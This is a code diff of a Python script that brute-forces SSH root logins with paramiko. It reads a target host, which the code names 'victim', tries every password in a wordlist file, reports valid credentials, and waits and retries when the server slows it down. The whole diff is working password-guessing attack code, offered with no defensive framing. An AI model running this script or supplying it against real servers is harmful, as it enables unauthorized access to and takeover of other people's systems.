@@ -1,49 +1,33 @@
 import paramiko
 import socket
-
- def answer(text):
-    print("Do you want to " + text + "?")
-    answer1 = input()
-    if (answer1.lower() == 'y'):
-        return True
-    if (answer1.lower() == 'n'):
-        return False
-    while (answer1.lower() != 'n' or answer1.lower() != 'y'):
-        print("The only available answers are 'y' as in yes or 'n' as in no")
-        answer1 = input()
-        break
+import time
 
 def sshAttack(host, username, password):
-    attacker = paramiko.SSHClient()
     
-
+    ssh = paramiko.SSHClient() 
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        attacker.connect(hostname= host, username= username, password=password)
-    except socket.timeout(): #In case we cannot connect to the desired server
+        ssh.connect(hostname=host, username=username, password=password, timeout=3)
+    except socket.timeout:
+        # In case the host is innactive
+        print("Host: {hostname} is unreachable.")
         return False
-
-    except paramiko.AuthenticationException: #If we cannot connect to the server        
-        print("Credentials are invalid")
+    except paramiko.AuthenticationException: #If credentials are wrong 
+        print("Invalid credentials for " +  username +  ":" + password)
         return False
-
+    except paramiko.SSHException:
+        print("Server taking too long, delaying next attempt")
+        time.sleep(60) #This is in order to avoid "spamming"
+        return sshAttack(host, username, password)
+    else:
+        # connection was established successfully
+        print("Right credentials at :\n\tHOSTNAME:" + host + "\n\tUSERNAME:" +  username + "\n\tPASSWORD:" + password + "\n")
+        return True
 
 print("Enter host")
-host = input();
-
-
+victim = input()
 password = open("wordlist.txt", 'r')
 password.readline()
 
 for p in password:
-    sshAttack(host, "root", p)
-    
-
-
-
-
-
-
-
-
-    
-        
+    sshAttack(str(victim),"root",p)
